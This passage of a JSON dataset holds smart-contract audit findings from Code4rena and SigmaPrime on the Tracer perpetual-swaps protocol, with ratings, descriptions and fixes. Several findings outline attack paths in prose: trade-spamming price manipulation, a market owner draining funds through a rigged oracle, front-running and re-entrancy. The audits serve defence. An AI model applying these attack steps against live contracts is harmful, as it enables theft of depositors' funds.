      "summary": "\nThe `withdrawERC20Token()` function in the `SafetyWithdraw` contract inherited by `TracerPerpetualSwaps` is meant to be an emergency withdrawal mechanism. However, given that the market creator/owner can potentially be untrusted/malicious, this poses a danger to users in a guarded launch. It is recommended that a pause/unpause feature is designed to pause deposits while allowing withdrawals by depositors instead of the owner. Alternatively, if this is meant to be for removing external ERC20 tokens accidentally deposited to the market, the `tracerQuoteToken` should be excluded from being given as the `tokenAddress`.\n\nThe impact of this is that if a malicious owner of a market withdraws/rugs all `tracerQuoteToken`s deposited at any time after market launch, all users lose deposits and the protocol takes a reputational hit and has to refund the users from treasury.\n\nThe risk of this issue was initially disputed, with the team thinking it was closer to a medium risk. However, it was marked as high risk due to the threat still persisting regardless of the owner manipulating in other ways. The mechanism is being removed and replaced with a more structured circuit breaker.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/81",
      "tags": [],
      "finders": []
    },
    {
      "id": "25484",
      "title": "[H-02] Use of incorrect index leads to incorrect updation of funding rates",
      "impact": "HIGH",
      "content": "_Submitted by 0xRajeev_\n\nThe `updateFundingRate()` function updates the funding rate and insurance funding rate. While the instant/new funding rates are calculated correctly, the cumulative funding rate calculation is incorrect because it is always adding the instant to 0, not the previous value. This is due to the use of `[currentFundingIndex]` which has been updated since the previous call to this function while it should really be using `[currentFundingIndex-1]` to reference the previous funding rate.\n\nThe impact of this, is that the cumulative funding rate and insurance funding rates are calculated incorrectly without considering the correct previous values. This affects the settling of accounts across the entire protocol. The protocol logic is significantly impacted, accounts will not be settled as expected, protocol shutdown and contracts will need to be redeployed. Users may lose funds and the protocol takes a reputation hit.\n\nRecommend using `[currentFundingIndex-1]` for non-zero values of `currentFundingIndex` to get the value updated in the previous call on lines L155 and L159 of `Pricing.sol`.\n\n**[raymogg (Tracer) confirmed](https://github.com/code-423n4/2021-06-tracer-findings/issues/74#issuecomment-873752562):**\n > Confirmed as an index issue with funding rate \n\n\n",
      "summary": "\nThis bug report is about an issue with the `updateFundingRate()` function in the `Pricing.sol` code. The instant/new funding rates are calculated correctly, however, the cumulative funding rate calculation is incorrect because it is always adding the instant to 0, not the previous value. This is due to the use of `[currentFundingIndex]` which has been updated since the previous call to this function.\n\nThe impact of this incorrect calculation is that the cumulative funding rate and insurance funding rates are calculated incorrectly without considering the correct previous values. This affects the settling of accounts across the entire protocol, resulting in users potentially losing funds and the protocol taking a reputation hit.\n\nThe recommendation is to use `[currentFundingIndex-1]` for non-zero values of `currentFundingIndex` on lines L155 and L159 of `Pricing.sol`. This was confirmed by raymogg (Tracer) as an index issue with the funding rate.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/74",
      "tags": [],
      "finders": []
    },
    {
      "id": "25483",
      "title": "[H-01] Wrong trading pricing calculations",
      "impact": "HIGH",
      "content": "_Submitted by 0xsanson, also found by shw_\n\nIn the `Pricing` contract, an agent can manipulate the trading prices by spamming a high amount of trades.\n\nIndeed an agent can create a high amount of orders at an arbitrary price and with a near-zero amount (so the agent doesn't even need large funds); next he/she pairs the orders with another account and calls `Trader.executeTrade`; now every order calls a `Pricing.recordTrade` using the arbitrary price set by the agent.\n\nSince the trades are all made in the same hour, by the way `hourlyTracerPrices[currentHour]` is calculated, it skews the average price towards the price set by the agent. This arbitrary value is used to calculate the `fundingRates` and the `fairPrice`, allowing a malicious agent the ability to manipulate the market.\n\nRecommend passing the `fillAmount` parameter to `recordTrade(...)`, and calculate `hourlyTracerPrices[currentHour].trades` summing `fillAmount` instead of 1 every trade.\n\n**[raymogg (Tracer) confirmed](https://github.com/code-423n4/2021-06-tracer-findings/issues/119#issuecomment-873747695):**\n > Issue is valid, and there appear to be a few other issues that reference similar problems.\n>\n> The Trader contract will have a whitelist allowing only select relayers to push orders on chain. As long as off chain order books have sufficient liquidity, this issue is then mitigated as users can't just arbitrarily match orders and send them in, they must be matched on a book with liquidity. To alter the price you would then need to eat through significant liquidity (increasing the cost of this attack).\n\n\n",
      "summary": "\nA bug has been found in the `Pricing` contract that allows an agent to manipulate the trading prices by spamming a high amount of trades. The agent can create a high amount of orders at an arbitrary price and with a near-zero amount, which will then be paired with another account and called `Trader.executeTrade`. This will cause `Pricing.recordTrade` to be called using the agent's arbitrary price. Since the trades are all made in the same hour, this skews the average price towards the agent's price, allowing the agent to manipulate the market.\n\nTo fix this issue, it is recommended to pass the `fillAmount` parameter to `recordTrade(...)`, and calculate `hourlyTracerPrices[currentHour].trades` summing `fillAmount` instead of 1 every trade. Raymogg (Tracer) confirmed that the issue is valid, and that the Trader contract will have a whitelist allowing only select relayers to push orders on chain. This will mitigate the issue, as long as off chain order books have sufficient liquidity, as users won't be able to arbitrarily match orders and send them in, they must be matched on a book with liquidity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/119",
      "tags": [],
      "finders": []
    },
    {
      "id": "53769",
      "title": "Miscellaneous Tracer Perpetual Pools V2General Comments",
      "impact": "LOW",
      "content": "## Description\n\nThis section details miscellaneous findings in the contracts repository discovered by the testing team that do not have direct security implications:\n\n1. **LeveragedPool.sol**\n   - **Stale Code**  \n     On line [336], there is commented-out code that is not used; this should be removed.\n   - **Similar Variable Names**  \n     In the function `feeTransfer()` on line [334], there is a local variable called `secondaryFee` and also a global variable called `secondaryFees`. It is recommended to change the name of the local variable so that it is more than one character different from the global variable to avoid confusion and the risk of typos altering the output of code.\n\n2. **PoolCommitter.sol**\n   - **Differing Limits for mintingFee**  \n     The use of constant `MAX_MINTING_FEE` to act as a bound for `mintingFee` is inconsistent. In function `updateMintingFee()`, we can set `mintingFee == PoolSwapLibrary.MAX_MINTING_FEE`. However, in function `setMintingFee()`, this value is not allowed as line [881] states `mintingFee < PoolSwapLibrary.MAX_MINTING_FEE`. The choice of `mintingFee` upper boundary should be made consistent.\n   - **Missing Event**  \n     On line [852], the function `setPool()` states it emits an event on success when it does not emit any events. The missing `SettlementAndPoolChanged` event should be added, or if it is not needed, then the comment on line [852] should be removed.\n   - **Misleading Comments**  \n     Line [628] states \"Prevent underflow by setting mintingFee to lowest possible value (0)\" however `mintingFee` is an IEEE 754 number and so supports negative numbers, meaning 0 is not its lowest possible value. The comment should be changed to something like \"Prevent underflow by setting mintingFee to lowest acceptable value (0).\"\n\n3. **InvariantCheck.sol**\n   - **Event Always Emitted**  \n     On line [45], the event `InvariantsHold` is emitted regardless of the outcome. This means that if the `if` clause on line [41] has triggered, then the event `InvariantsFail` will be emitted, immediately followed by the `InvariantsHold` event. This could confuse any off-chain bots or alert systems. This can be solved by adding a `break` command on line [44] inside the `if` clause.\n\n4. **SMAOracle.sol**\n   - **Additional Notation Needed**  \n     On line [72], we have the variable `updateInterval`; this duration should have a comment outlining the expected time units it should be supplied in.\n\n5. **PoolSwapLibrary.sol**\n   - **Equation Clarity**  \n     On line [302], use brackets for clarity on the intended order of operation.\n   - **Incorrect Comments**  \n     The comment on line [426] should read \"settlement tokens to return\" as no settlement tokens are being burnt.\n   - **Incomplete Zero Checks**  \n     Functions `getMint()` and `getBurn()` both contain a zero price check on line [433] and line [447] respectively. However, as they are checking IEEE 754 standard numbers, they should also check for negative zero.\n\n6. **PoolFactory.sol**\n   - **Constant Name**  \n     Constant `DAYS_PER_LEAP_YEAR` on line [42] has a misleading name, as it actually records the number of seconds in a leap year.\n\n7. **KeeperRewards.sol**\n   - **Unclear Comments**  \n     The comment on line [107] is unclear; the `_keeperGas` variable is actually denoted in the settlement token quantity, not wei, which suggests it is an ETH quantity. The number format is already made clear by the \"WAD formatted\" comment. Changing the comment to \"keeper gas cost in settlement tokens.\" would make its meaning clearer.\n   - **Additional Comment Required**  \n     Adding a comment to line [54] that the price returned by the oracle must always match the 18d.p. style of Chainlink ETH/Token oracles will help prevent future mistakes should a different external oracle be chosen.\n\n8. **AutoClaim.sol**\n   - **Typo**  \n     On line [182], \"where the all supplied\" should be \"where all the supplied.\"\n\n9. **CalldataLogic.sol**\n   - **Typo**  \n     On line [10], \"bite array\" should be \"byte array.\"\n   - **Specify Intent**  \n     On lines [63-66], the use of inline assembly could be improved by clarifying the aims of this code to help catch errors. There should be a comment documenting that due to line [63], the outputted amount is implicitly capped by `uint128.max` even though it is a `uint256`.\n\n10. **vendors/ERC20_Cloneable.sol**\n    - **Missing Zero Address Check**  \n      The function `transferOwnership()` contains a zero address check for setting `owner`, however the `initialize()` function is lacking one when `owner` is initially set.\n    - **Missing Event**  \n      The function `transferOwnership()` has no event to record a transfer of ownership. This could help off-chain bots detect and monitor ownership of the pool tokens.\n    - **Missing Visibility**  \n      The visibility of `_decimals` on line [34] is not explicitly set; this should be stated for clarity.\n\n## Recommendations\n\nEnsure that the comments are understood and acknowledged, and consider implementing the suggestions above.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "53768",
      "title": "There is Currently no Incentive to Continuously Monitor Pools And Perform Invariant Checking",
      "impact": "LOW",
      "content": "## Description\nThe `InvariantCheck.sol` contract allows any user to call `checkInvariants()` when the balance invariant does not hold true. As a result, leveraged pools may be put in an unstable state for some time before a user decides to pause the contracts by calling `checkInvariants()`.\n\n## Recommendations\nConsider implementing some small incentive that rewards users who monitor leveraged pools when invariants do not hold true. This will ensure affected pools are able to respond quickly to attacks on the protocol.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "53767",
      "title": "Update Timestamps For SMAOracle And LeveragedPool May Diverge Due to a Backlog of Update Intervals",
      "impact": "MEDIUM",
      "content": "## Description\n\nThe Tracer DAO protocol is able to deal with inactive keepers by queuing commitments for execution on the next upkeep. The protocol can handle up to 16 backlogged update intervals on each upkeep. As a result, `lastPriceTimestamp` in `LeveragedPool.sol` and `lastUpdate` in `SMAOracle.sol` may diverge such that they are both no longer equal. If the amount by which these two timestamps diverge is greater than the front-running interval (typically set to 300 seconds), users could commit to a price outcome which is favourable to them.\n\nA user attempting to perform such an attack only needs to delay an upkeep by 300 seconds or find a relatively inactive pool that has had its oracle frequently polled. If the attacker consistently upkeeps on each new update interval and keeps the oracle data fresh, it is likely that they can consistently arbitrage the price differential by front-running a commit to the winning side of the leveraged pool.\n\n## Recommendations\n\nConsider restricting calls to `SMAOracle.poll()` such that they must originate from the `PoolKeeper.sol` or `KeeperRewards.sol` contracts. This will ensure the two update timestamps are always synced.",
      "summary": "\nThe Tracer DAO protocol has a bug that allows users to manipulate the price outcome in their favor. This happens when the `lastPriceTimestamp` and `lastUpdate` timestamps in two contracts become different, which can occur if an upkeep is delayed or if a pool's oracle is not frequently polled. To prevent this, it is recommended to restrict calls to `SMAOracle.poll()` to only come from specific contracts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19755",
      "title": "Orders Can Be Created That Can Never Be Filled",
      "impact": "LOW",
      "content": "Description\r\nUsers can create orders, but they do not effect their balances until another party takes the other side of the\r\norder. This means users can create orders, then withdraw all their deposit leaving orders which cannot be taken\r\n(as the creating users margin will fall too low).\r\nWe raise this to be aware that there can be many unusable active orders listed on a tracer market.\r\nRecommendations\r\nEnsure this is the desired behaviour.\r\nA system of closing open orders when withdrawing an entire balance could be enforced, should this behaviour\r\nnot be expected.\r\n\r\nTCR-35 Unused Variables & Functions\r\nAsset contracts/\r\nStatus Open\r\nRating Informational\r\nDescription\r\nThe variable DIVIDE_PRECISION is not used internally in Account.sol and Pricing.sol nor by any other\r\ncontracts.\r\nThe variable Account.currentLiquidationId is not used. Note this is not to be confused with\r\nReceipt.currentLiquidationId which is used.\r\nThe function Account.updateAccount() can only be called by a Tracer which does not make this call. Hence,\r\nthe function is unused.\r\nIn LibBalances.sol the variable FEED_UNIT_DIVIDER is unused in addition to the functions\r\ncalcLeveragedNotionalValue() and calcMarginPositionValue() .\r\nRecommendations\r\nWe recommend removing the unused variables and functions to improve code usability and maintainability.\r\n\r\nTCR-36 Miscellaneous General Statements\r\nAsset contracts/\r\nStatus Open\r\nRating Informational\r\nDescription\r\nThis section describes general observations made by the testing team during this assessment that do not have\r\ndirect security implications:\r\nInsurance.sol line [ 158] -difference can just be set to 10**18 .\r\nInsurancePoolToken.sol - line [ 54] - This can be called by anyone and stakers have an incentive to set\r\nthe maximum possible amount. It would make it easier to use and more intuitive to rename the function\r\ntoregisterNewDeposits() without a parameter. The function would account for all new unregistered\r\ndeposits.\r\nAccount.sol _deposit() does not require a depositor parameter, msg.sender is always sent to it.\r\nInsurance.sol the value pools[market].market is unnecessary.\r\nInsurance.sol line [ 276] is unnecessarily blank.\r\nPricing.sol the values IPoolFundingRateValue and IPoolFundingRate should both begin with a\r\nlower case i to conform with solidity style guides.\r\nPricing.sol the variable uint256 hour is cast to the same type uint256(hour) twice in each of the\r\nfunctions getHourlyAvgTracerPrice() and getHourlyAvgOraclePrice() .\r\nTracer.sol the event OrderFilled field amount is set the function parameter amount rather than\r\nfilledAmount .\r\nTracer.sol the variable gasCost on line [ 156] is actually the gas price not gas cost (gas cost = gas price\r\n* gas used).\r\nTracer.sol the variable FUNDING_RATE_SENSITIVITY is not a constant and should be camel-case.\r\nTracer.sol marketIds for tracers do not need to be unique and so can emit similar logs.\r\nRecommendations\r\nEnsure that the comments are understood and acknowledged, and consider implementing the suggestions above.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19754",
      "title": "Trades can be Executed with Different Amounts",
      "impact": "LOW",
      "content": "Description\r\nThe function executeTrade() can be called on two orders which have a different amount. The result is that\r\nthe larger trade will be executed but not entirely filled. It will remain open on the Tracer market for other users\r\nto trade with.\r\nRecommendations\r\nEnsure this is desirable behaviour, otherwise add a check to verify that the amounts of each pairs of orders are\r\nthe same.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19753",
      "title": "Front Running",
      "impact": "LOW",
      "content": "Description\r\nEthereum transactions are able to be read in the mempool before they are executed. Users are able to see these\r\ntransaction then create their own transaction with a higher gas price that will likely be executed first.\r\nOrders that are being made or taken in Tracer are vulnerable to front-running as bots may first see these orders\r\nthen execute their own orders potentially arbitraging two trades.\r\nFront-running can be applied to perform a Denial of Service (DoS) on Trader.executeTrade() . A user can\r\ncause an entire executeTrade() transaction to revert by executing their own transactions first. Possible trans-\r\nactions users can do to cause executeTrade() to revert include:\r\nHave one user remove permission for the Trader in the Tracer\r\nCall executeTrade() from one of the accounts to increase their nonce\r\nWithdraw funds from the Tracer such that the margin is no longer valid.\r\nRecommendations\r\nEnsure this is the most desirable behaviour, otherwise consider skipping a pair of trades rather than reverting if\r\none of them fails.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19752",
      "title": "Zero Address Passes verifySignature()",
      "impact": "LOW",
      "content": "Description\r\nThe function verifySignature() is used to ensure that a user has signed a specific message.\r\nThe function consists of the following statement,\r\nreturn signer == ecrecover ( hashOrder ( order ), sigV , sigR , sigS );\r\nIfecrecover() receives an invalid signature it will return the zero address.\r\nAs a result, if signer is set to the zero address and an invalid signature is given to verifySignature() it will\r\nreturn true.\r\nThe impact is informational as the zero address is not owned and so the Trader would not have permission to\r\nact on behalf of the zero address and calls to executeTrade will fail.\r\nRecommendations\r\nThis issue may be mitigated by adding a check to verifySignature() to ensure that the signer is not the zero\r\naddress.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19751",
      "title": "User Created Markets Can Be Exploited By Owner",
      "impact": "LOW",
      "content": "Description\r\nThe owner of a Tracer market is set when it is create by the TracerFactory . Arbitrary users have the ability\r\nto create a Tracer and set the owner to an arbitrary address. These user generated markets are notmarked as\r\nDAO approved.\r\nThe owners of markets have the ability to call specific onlyOwner functions such as\r\nsetInsuranceContract()\r\nsetAccountContract()\r\nsetPricingContract()\r\nsetOracle()setGasOracle()\r\nsetFeeRate()\r\nsetMaxLeverage()\r\nsetFundingRateSensitivity()\r\nThis gives the owner power to make changes to the market that directly increase the owners margin.\r\nFor example an owner may take all the funds from the market by doing the following steps:\r\n1. Take an order with a long position\r\n2. Call Tracer.setOracle() to one an address the returns the price 1,000,000,000x the real value\r\n3. Call Account.withdraw() taking the entire market balance ( Account.tvl[market] )\r\nRecommendations\r\nThe development team are aware of risks of this design. The variable TracerFactory.daoApproved is used to\r\ndifferentiate user generate markets from DAO owned markets where this attack is not feasible.\r\nIt should be made clear to users the potential to steal funds by owners in user generated markets.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19750",
      "title": "Lack of Limitations/Validation To Set Variables in Tracer",
      "impact": "LOW",
      "content": "Description\r\nThe owner of a Tracer is able to set a range of variables which effect user rewards and borrowing functionality.\r\nThe functions that do not contain any limitations or validations are:\r\nsetFeeRate()\r\nsetMaxLeverage()\r\nsetFundingRateSensitivity()\r\nIt is also possible to set the addresses to the zero address ( 0x0) for each of external contracts. That is:\r\nsetInsuranceContract()\r\nsetAccountContract()\r\nsetPricingContract()\r\nsetOracle()\r\nsetGasOracle()\r\nRecommendations\r\nConsider adding some reasonable upper and lower bounds where feasible to the setter functions, such as\r\nrequire(feeRate <= 20%) and 0 <= maxLeverage < 10x .\r\nHistorically, it has been the case that when nothing has been entered into a UI when interacting with a smart\r\ncontract address field, the 0x0 address has been sent as a place holder. For this reason we typically recommend\r\nsafe guarding against users inadvertently entering the 0x0 address.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19749",
      "title": "Unnecessary calcEscrowLiquidationAmount() function",
      "impact": "LOW",
      "content": "Description\r\nThe calcEscrowLiquidationAmount() function returns simply - getUserMinMargin() or 0 if this value is less\r\nthan 0. We raise this as its own separate issue to ensure the calculation is as expected.\r\nThe function is:\r\nfunction calcEscrowLiquidationAmount (\r\naddress liquidatee ,\r\nint256 currentUserMargin ,\r\naddress market\r\n)internal view returns (uint256 ) {\r\nint256 minMargin = getUserMinMargin ( liquidatee , market );\r\nint256 amountToEscrow = currentUserMargin .sub( minMargin . sub( currentUserMargin ));\r\nif( amountToEscrow < 0) {\r\nreturn 0;\r\n}\r\nreturn uint256 ( amountToEscrow );\r\n}\r\nThe currentUserMargin gets subtracted from itself and therefore is an unnecessary parameter for the function.\r\nRecommendations\r\nEnsure the calculation in this function is desired. If so, consider either removing the function entirely and using\r\nsimply getUserMinMargin or removing the effectively unused currentUserMargin parameter which currently\r\nsimply serves to cost extra gas in the function call.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19748",
      "title": "Tracer constructor parameters",
      "impact": "LOW",
      "content": "Description\r\nThe Tracer contract takes a set of variables in the constructor which are required for the market to function.\r\nWe note a few observations with these parameters here.\r\nFirstly, a Tracer contract allows any user (via the TracerFactory contract) to choose their own Account\r\ncontract. This means that malicious users can have malicious tracers with arbitrary malicious account contracts.\r\nFortunately, the global Insurance contract has its own Account contract set and doesnt rely on the account\r\ncontract set in the tracer. The Insurance contract will still deem such a malicious tracer as valid (as it was\r\ndeployed from the TracerFactory ). It is dangerous having contracts such as the Insurance contract running\r\narbitrary code (by calling tracer functions which call arbitrary external contracts) and this may not be desired by\r\nthe developers.\r\nSecondly, the insuranceContract is required for contract functionality but is not set in the constructor. As a\r\nresult users will not be able to take or match orders until the owner has called setInsuranceContract() to be\r\nan address which implements the IInsurance interface.\r\nRecommendations\r\nEnsure the risk profile here is as expected. It is more secure to inject the account contract in the deployment of\r\nthe tracer by sending it to the deployer (so that arbitrary tracers can still be deployed) and having the deployer\r\ninject the account contract. This is however more restrictive for users deploying custom tracers.\r\nIt may be beneficial to reduce the number of required transactions and likelihood of user error by modifying the\r\nconstructor to take the address of the insuranceContract .\r\nPage | 35\r\nTracer Protocol Detailed Findings\r\nTCR-27 Checks-Effects-Interaction Pattern\r\nAsset contracts/\r\nStatus Open\r\nRating Informational\r\nDescription\r\nRe-entrancy [4] is a common solidity attack that can occur when contracts perform external calls to other user-\r\ndefined arbitrary contracts. The checks-effects-interactions pattern [5] is a recommended solidity programming\r\npattern to use where possible. Developers should perform all necessary checks, followed by state changes and\r\nfinally perform all external calls at the end of the function.\r\nTracer has a number of functions that could theoretically (but with low likelihood) be effected by re-entrancy, an\r\nexample is in TCR-15.\r\nThe following functions do not follow the checks effects interaction pattern:\r\nAccount.sol - deposit()\r\nAccount.sol - withdraw()\r\nInsurance.sol - stake()Insurance.sol - withdraw()\r\nInsurance.sol - drainPool()\r\nInsurance.sol - updatePoolAmount()\r\nAs an example in Insurance.sol\r\n107 // Pool tokens become margin tokens\r\n108 poolToken . burn ( msg.sender , amount );\r\n109 token . safeTransfer ( msg.sender , tokensToSend );\r\n110 pool . amount = pool . amount . sub ( tokensToSend );\r\nThe storage change pool.amount occurs after the external call.\r\nRecommendations\r\nWe recommend all functions (where possible) follow the checks-effects-interaction pattern to minimize the re-\r\nentrancy attack surface in these functions.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19747",
      "title": "Partially Implemented feeRate",
      "impact": "LOW",
      "content": "Description\r\nThe variable feeRate has only been implemented in the function makeOrder() . This variable is not used in\r\nthe functions takeOrder() and matchOrders()\r\nThe impact is that users are not being charged the allocated fee when taking or matching orders.\r\nRecommendations\r\nWe recommend either adding feeRate to the calculations in takeOrder() and matchOrders() . Alternatively,\r\nremove feeRate if it is not needed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19746",
      "title": "Potential Contract Configuration Mismatch",
      "impact": "LOW",
      "content": "Description\r\nEach Tracer will have a Pricing and Account contract. The Pricing contract is used to determine the\r\nfunding rate and the Account contract maintains the token balances for the markets. The Account contact\r\nstores the address of the Pricing contract, which is required to perform calculations.\r\nWhen a Tracer is deployed the Account and Pricing contracts may be set in the constructor and stored\r\nin the variables Tracer.pricingContract and Tracer.accountContract . Similarly, when an Account con-\r\ntract is deployed it sets the Account.pricing variable.\r\nThere are no requirements for Account.pricing to match Tracer.pricingContract . The impact would be\r\nthat the calculations of the funding rate and fair prices would different significantly between the Tracer and\r\nAccount .\r\nThis issue would occur if a user wished to re-use the Account contract from one market but set its own\r\nPricing contract.\r\nRecommendations\r\nThe potential mismatch between pricing contracts may be prevent by any of the following:\r\nRetrieving the pricing contract from the Tracer each time it is used in Account\r\nCaching pricing contracts as a map mapping each Tracer to a Pricing contract in Account\r\nIn the construction of the Tracer enforcing accountContract.pricing == _pricingContract",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19745",
      "title": "Matching Filled Orders",
      "impact": "LOW",
      "content": "Description\r\nThe function _matchOrder() allows two orders to be matched together and executed. An order is considered\r\nfilled when order.filled is set to order.amount .\r\nDuring the process of matching two orders the amount to be filled is the minimum remaining of these two orders.\r\nWhen one order is filled the remaining amount is zero (0) and thus the orders will be executed for zero amount.\r\nThis would allow users to manipulate the TWAP price by executing already filled orders repeatedly.\r\nRecommendations\r\nConsider adding a check to _matchOrder() to ensure fillAmount is strictly greater than zero.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19744",
      "title": "Insertion of Expired Orders",
      "impact": "LOW",
      "content": "Description\r\nThere are no sanity checks on the value expiration of an order.\r\nAs a result it is possible for a user to submit expired orders. These orders are never able to be matched since\r\nthey are expired.\r\nRecommendations\r\nConsider adding some sanity checks to enforce users to submit orders that have an expiration time greater than\r\nthe current timestamp.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19743",
      "title": "Overwrite orderIdByHash for Duplicate Orders",
      "impact": "LOW",
      "content": "Description\r\nWhen orders are made they are given an orderId and a helper mapping orderIdByHash which takes the hash\r\nof the order and returns the orderId .\r\nIf two orders are made with the same hashOrder() value, then the value orderIdByHash will be overwritten.\r\nNote to have an overlap in the hashOrder() output the orders must have the same maker .\r\nRecommendations\r\nConsider rejecting orders which already have an entry in orderIdByHash . If users wish to make another order\r\nof the same price and amount they are able to modify the expiration.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19742",
      "title": "TWAPS Exclude Hours Where Price is Zero",
      "impact": "LOW",
      "content": "Description\r\nThe Time Weighted Average Price (TWAP) is a weighted average of the prices over the previous eight (8) hours,\r\nwith the most recent hour having a weighting of eight (8) and the oldest hour a weighting of one (1).\r\nAn hour is excluded from the calculations if it has price of zero (0), as seen in the following code.\r\nint256 derivativePrice = getHourlyAvgTracerPrice ( uint256 (j), market );\r\nint256 underlyingPrice = getHourlyAvgOraclePrice ( uint256 (j), market );\r\nif( derivativePrice != 0) {\r\nderivativeInstances = derivativeInstances . add ( uint256 ( timeWeight ));\r\nderivativeSum = derivativeSum . add (( timeWeight ). mul( derivativePrice ));\r\n}\r\nif( underlyingPrice != 0) {\r\nunderlyingInstances = underlyingInstances . add ( uint256 ( timeWeight ));\r\nunderlyingSum = underlyingSum . add (( timeWeight ). mul( underlyingPrice ));\r\n}\r\nHowever, a price of zero (0) may be a valid price for some markets and thus should not be ignored from the\r\ncalculations.\r\nRecommendations\r\nWe recommend modifying the check to be pricing.hourlyTracerPrices[hour].numTrades == 0\r\npricing.hourlyOraclePrices[hour].numTrades == 0 respectively to account for the zero (0) price.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
